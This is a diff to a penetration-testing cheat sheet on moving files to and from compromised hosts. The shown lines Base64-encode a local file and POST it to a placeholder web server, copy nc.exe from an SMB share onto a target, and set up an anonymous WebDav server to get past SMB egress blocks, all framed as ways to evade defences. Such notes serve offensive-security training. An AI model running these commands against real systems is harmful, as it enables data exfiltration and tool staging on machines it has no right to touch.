@@ -23,7 +23,7 @@ Sometimes to bypass defences and detection mechanisms, we need to use various me
 
 The same Base64 techniques can be used to upload files to a web server
 ```PowerShell
-$b64 = [System.convert]::ToBase64S=tring((Get-Content -Path '<File Path>' -Encoding Byte))
+$b64 = [System.convert]::ToBase64String((Get-Content -Path '<File Path>' -Encoding Byte))
 Invoke-WebRequest -Uri '<Webserver Address>' -Method POST -Body $b64
 ```
 
@@ -102,6 +102,20 @@ On the target system, mount and then copy the file
 ```cmd
 net use n: \\<ip>\share /user:test test
 copy n:\nc.exe
+```
+
+## SMB Uploads
+Often, companies do not allow SMB connections outside of the internal network as this could open up potential attacks. However, SMB can be used over HTTP & HTTPS. The `WebDav` extension of HTTP enables a webserver to behave like a fileserver. When making an SMB connection to a `WebDav` server, if its initial SMB protocol attempt fails, it will fallback to trying the HTTP protocol.
+
+To setup a `WebDav` server:
+```bash
+sudo pip3 install wsgidav cheroot
+sudo wsgidav --host=<ip> --port=80 --root=/tmp --auth=anonymous
+```
+
+To then connect to the server on the target:
+```cmd
+dir \\<ip>\
 ```
 
 ## FTP Downloads
